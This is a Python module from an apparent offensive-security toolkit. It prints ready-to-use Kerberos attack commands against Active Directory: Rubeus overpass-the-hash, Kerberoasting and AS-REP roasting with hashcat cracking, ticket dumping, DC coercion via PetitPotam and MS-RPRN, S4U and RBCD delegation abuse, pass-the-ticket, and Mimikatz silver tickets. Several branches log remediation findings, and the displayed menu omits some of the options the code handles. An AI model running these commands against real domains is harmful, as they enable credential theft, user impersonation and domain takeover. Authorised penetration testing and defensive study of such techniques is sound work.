"""
Module: Rubeus — Kerberos Exploitation Suite
Techniques: OPtH, Kerberoast, AS-REP, Monitor, S4U, PTT, Silver, Renew
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("RUBEUS", "Advanced Kerberos Exploitation")
    dom  = input_or_session("domain",   "Domain")
    dc   = input_or_session("dc_ip",    "DC IP")
    user = input_or_session("username", "Username")

    print(f"""
  [1]  Overpass-the-Hash (NTLM → TGT)
  [2]  Kerberoasting
  [3]  AS-REP Roasting
  [4]  Dump / Triage tickets
  [8]  Pass-the-Ticket (.kirbi inject)
  [9]  Silver Ticket (altservice)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        tuser = prompt("Target username")
        nth   = prompt("NTLM hash")
        aes   = prompt("AES256 key (blank = use RC4)")
        if aes:
            print(f"""
  {Y}Rubeus OPtH (AES256 — stealthy):{RST}
  .\\Rubeus.exe asktgt /user:{tuser} /aes256:{aes} /opsec /ptt
  .\\Rubeus.exe asktgt /user:{tuser} /aes256:{aes} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe
""")
        else:
            print(f"""
  {Y}Rubeus OPtH (RC4/NTLM):{RST}
  klist purge
  .\\Rubeus.exe asktgt /user:{tuser} /rc4:{nth} /ptt
  .\\Rubeus.exe asktgt /user:{tuser} /rc4:{nth} /createnetonly:C:\\Windows\\System32\\cmd.exe
""")
        add_finding("Overpass-the-Hash (Rubeus)", "Critical",
                    f"TGT forged for {tuser}",
                    "Enable AES-only Kerberos; monitor TGTs with RC4 encryption")

    elif c == "2":
        print(f"""
  {Y}Kerberoasting:{RST}
  .\\Rubeus.exe kerberoast /outfile:kerberoast.txt
  .\\Rubeus.exe kerberoast /user:<target_svc> /outfile:kerberoast.txt
  .\\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt   # opsec-safe

  {Y}Crack:{RST}
  hashcat -m 13100 kerberoast.txt rockyou.txt --rules-file best64.rule
""")

    elif c == "3":
        print(f"""
  {Y}AS-REP Roasting:{RST}
  .\\Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
  .\\Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat /nopreauth:<users_file>

  {Y}Crack:{RST}
  hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule
""")

    elif c == "4":
        print(f"""
  {Y}Triage & Dump:{RST}
  .\\Rubeus.exe triage
  .\\Rubeus.exe dump /nowrap
  .\\Rubeus.exe dump /luid:0x5379f2 /nowrap
  .\\Rubeus.exe dump /service:krbtgt /nowrap

  {Y}Mimikatz alternative:{RST}
  sekurlsa::tickets /export
  kerberos::ptt c:\\path\\to\\ticket.kirbi
""")

    elif c == "5":
        interval = prompt("Monitor interval (seconds)") or "5"
        print(f"""
  {Y}Monitor TGTs (run on unconstrained delegation server):{RST}
  .\\Rubeus.exe monitor /interval:{interval} /nowrap

  {Y}Coerce DC auth (separate terminal):{RST}
  .\\MS-RPRN.exe \\\\{dc} \\\\<unconstrained_server>
  python3 tools/PetitPotam/PetitPotam.py -u {user} -p '<pw>' -d {dom} <attacker_ip> {dc}

  {Y}Inject captured TGT:{RST}
  .\\Rubeus.exe ptt /ticket:doIFxTCCBc...
  impacket-secretsdump -k -no-pass {dom}/DC$@{dc}
""")
        add_finding("TGT Capture via Unconstrained Delegation", "Critical",
                    "DC TGT captured via coercion attack",
                    "Remove unconstrained delegation; add DAs to Protected Users group")

    elif c == "6":
        svc_user = prompt("Service account with delegation")
        svc_hash = prompt("Service account NTLM hash")
        imperson = prompt("User to impersonate") or "Administrator"
        spn      = prompt("Target SPN (e.g. time/DC01)")
        altspn   = prompt("Alt SPN (e.g. ldap/DC01, blank = same)")
        alt_flag = f"/altservice:{altspn}" if altspn else ""
        print(f"""
  {Y}S4U Constrained Delegation:{RST}
  .\\Rubeus.exe asktgt /user:{svc_user} /rc4:{svc_hash} /domain:{dom} /nowrap

  .\\Rubeus.exe s4u /ticket:doIE... /impersonateuser:{imperson} /msdsspn:{spn} {alt_flag} /ptt

  {Y}One-liner (with hash):{RST}
  .\\Rubeus.exe s4u /user:{svc_user} /rc4:{svc_hash} /impersonateuser:{imperson} \\
    /msdsspn:{spn} {alt_flag} /ptt /domain:{dom}
""")
        add_finding("Constrained Delegation S4U", "Critical",
                    f"Impersonated {imperson} via {svc_user} delegation",
                    "Restrict TrustedToAuth accounts; audit delegation scope")

    elif c == "7":
        comp_user = prompt("Attacker computer account (e.g. evilComp$)")
        comp_hash = prompt("Computer account NTLM hash")
        target    = prompt("Target machine")
        imperson  = prompt("Impersonate user") or "Administrator"
        print(f"""
  {Y}RBCD S4U exploit:{RST}
  .\\Rubeus.exe s4u /user:{comp_user} /rc4:{comp_hash} /impersonateuser:{imperson} \\
    /msdsspn:CIFS/{target}.{dom} /ptt

  {Y}Access:{RST}
  dir \\\\{target}\\C$
  impacket-psexec {dom}/{imperson}@{target} -k -no-pass
""")

    elif c == "8":
        kirbi = prompt(".kirbi file or base64 ticket")
        print(f"""
  {Y}Pass-the-Ticket:{RST}
  .\\Rubeus.exe ptt /ticket:{kirbi}
  klist
  .\\Rubeus.exe purge   # cleanup
""")

    elif c == "9":
        svc_hash = prompt("Service/machine account hash")
        dom_sid  = prompt("Domain SID")
        target   = prompt("Target host")
        service  = prompt("Service type (HOST/CIFS/LDAP/HTTP)") or "CIFS"
        imperson = prompt("Impersonate user") or "Administrator"
        print(f"""
  {Y}Silver Ticket (Mimikatz):{RST}
  kerberos::golden /user:{imperson} /domain:{dom} /sid:{dom_sid} \\
    /rc4:{svc_hash} /target:{target}.{dom} /service:{service} \\
    /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /ptt

  {Y}Useful services:{RST}
  HOST → schtasks/WMI   CIFS → file shares
  LDAP → DCSync         HTTP → WinRM
  WSMAN → PSRemoting    MSSQLSvc → MSSQL
""")

    elif c == "10":
        print(f"""
  {Y}Renew / Purge:{RST}
  .\\Rubeus.exe purge
  .\\Rubeus.exe renew /ticket:doIFx... /ptt
  klist purge
""")

    pause()
